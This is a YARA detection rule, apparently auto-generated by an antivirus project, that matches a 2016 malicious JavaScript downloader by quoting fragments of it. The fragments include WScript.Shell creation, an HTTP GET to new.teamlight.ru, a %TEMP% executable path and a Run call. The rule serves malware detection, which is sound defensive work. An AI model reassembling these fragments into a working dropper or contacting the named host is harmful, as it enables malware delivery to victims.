rule sig_20160330_053a90fd37cb692c01bd3730d4a32e6d {
  meta:
    description = "datamaliciousorder - file 20160330_053a90fd37cb692c01bd3730d4a32e6d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9f7aba69d546099f74af934526ee407d6a544b2bc599d5ad7c41eda1be678a05"

  strings:
    $s1  = "var QU = function F() {return WScript[ST](\"WScript\"+\".Shell\");}(), AQ = 11;" fullword ascii
    $s2  = "CI[Y](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s3  = "function PG(H0, FI){RB = RB * 1; return H0 - FI;};" fullword ascii
    $s4  = "if (CI[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HE() {return QU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"INzlLa6t.ex\" + \"e\";};" fullword ascii
    $s6  = "function K(){return LR + \"\";};" fullword ascii
    $s7  = "function YY(H){QU[\"Run\"](H, RB, RB);};" fullword ascii
    $s8  = "function W() {return ((UP == true) && (UP == Y0)) ? 1 : RB;};" fullword ascii
    $s9  = "function N()" fullword ascii
    $s10 = "function CM(){return 22;};" fullword ascii
    $s11 = "return PG(G, D);" fullword ascii
    $s12 = "function TQ(){return ST;};" fullword ascii
    $s13 = "}while (OM);" fullword ascii
    $s14 = "var IQ = new this[\"Date\"]();" fullword ascii
    $s15 = "function Z(SY) {var SN = (1, 2, 3, 4, 5, SY); return SN;};" fullword ascii
    $s16 = "var Y0 = false;" fullword ascii
    $s17 = "var PZ = false;" fullword ascii
    $s18 = "UP = true; " fullword ascii
    $s19 = "var UP = false;" fullword ascii
    $s20 = "Y0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}